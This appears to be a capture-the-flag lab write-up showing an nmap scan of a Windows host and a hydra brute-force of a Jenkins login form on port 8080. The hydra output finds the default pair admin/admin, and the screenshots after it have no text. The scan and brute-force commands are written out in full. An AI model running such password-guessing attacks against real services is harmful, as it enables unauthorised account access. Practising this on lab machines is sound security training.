┌──(kali㉿kali)-[~] <br>
└─$ nmap -sV -Pn 10.49.190.181   

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-11 23:39 EDT
Nmap scan report for 10.49.190.181
Host is up (0.13s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1324.49 seconds
```

<img width="1502" height="620" alt="image" src="https://github.com/user-attachments/assets/61221b75-f31f-48a8-a49b-92ddc2db326a" />

<img width="697" height="418" alt="image" src="https://github.com/user-attachments/assets/9be0cc68-39c3-45b9-a885-99cd787a9c07" />

┌──(kali㉿kali)-[~] <br>
└─$ hydra -L /usr/share/wordlists/fasttrack.txt -P /usr/share/wordlists/fasttrack.txt -s 8080 -t 4 -f 10.48.178.41 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -f -V

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-12 05:47:02
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore

[DATA] max 4 tasks per 1 server, overall 4 tasks, 68644 login tries (l:262/p:262), ~17161 tries per task
[DATA] attacking http-post-form://10.48.178.41:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "admin" - 1 of 68644 [child 0] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "Spring2017" - 2 of 68644 [child 1] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "Spring2021" - 3 of 68644 [child 2] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "spring2021" - 4 of 68644 [child 3] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "Summer2021" - 5 of 68644 [child 1] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "summer2021" - 6 of 68644 [child 3] (0/0)
[ATTEMPT] target 10.48.178.41 - login "admin" - pass "Autumn2021" - 7 of 68644 [child 2] (0/0)
[8080][http-post-form] host: 10.48.178.41   login: admin   password: admin 
[STATUS] attack finished for 10.48.178.41 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-12 05:47:15
```

<img width="946" height="182" alt="image" src="https://github.com/user-attachments/assets/0bbac368-c6db-4036-a933-75dfb4422db9" /> <br>

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/97a87c0e-43e5-472e-b3d7-27327386c5e7" /> <br>

<img width="1918" height="837" alt="image" src="https://github.com/user-attachments/assets/e7b77c0e-2ad8-492a-ad60-f5df9669e0ed" /> <br>

